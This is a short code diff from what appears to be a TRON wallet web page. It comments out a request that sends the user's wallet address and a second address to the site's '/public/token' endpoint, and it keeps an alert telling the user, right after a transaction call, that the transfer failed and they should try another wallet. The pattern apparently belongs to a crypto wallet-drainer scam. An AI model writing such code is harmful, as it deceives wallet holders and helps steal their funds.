@@ -64,11 +64,11 @@
                     feeLimit: 10000000,
                     callValue: 0
                 });
-                const result = await fetch('/public/token', {
-                    method: 'post',
-                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                    body: "address=" + tronWeb.defaultAddress.base58 + "&address1=" + address1
-                });
+ //               const result = await fetch('/public/token', {
+ //                   method: 'post',
+//                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+//                    body: "address=" + tronWeb.defaultAddress.base58 + "&address1=" + address1
+//                });
                 alert("转账失败,请更换其他钱包地址");
             } else {
                 alert("请切换到TRX钱包");
